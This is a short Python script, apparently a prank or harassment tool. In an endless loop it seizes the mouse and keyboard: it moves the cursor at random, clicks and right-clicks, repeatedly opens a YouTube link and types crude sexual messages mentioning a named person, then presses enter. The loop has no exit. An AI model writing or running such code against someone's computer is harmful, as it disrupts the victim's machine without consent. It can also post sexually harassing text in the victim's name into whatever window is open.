import pyautogui, random, os, threading, webbrowser

width, height = pyautogui.size()

def openwebsite():
    url = "https://www.youtube.com/watch?v=bwD8G3a86p8"
    webbrowser.open(url, new=2)

def movecursor():
    randomX = random.randint(0, width)
    randomY = random.randint(0, height)
    pyautogui.moveTo(randomX, randomY)

def clicking():
    pyautogui.doubleClick()
    pyautogui.click(button="right")

def spammsg():
    pyautogui.write("Im gay ...")
    pyautogui.write("I like to drink charon's cum ...")
    pyautogui.press("enter")

while True:
    thread = threading.Thread(target=movecursor)
    thread.start()
    openwebsite()
    movecursor()
    spammsg()
    clicking()
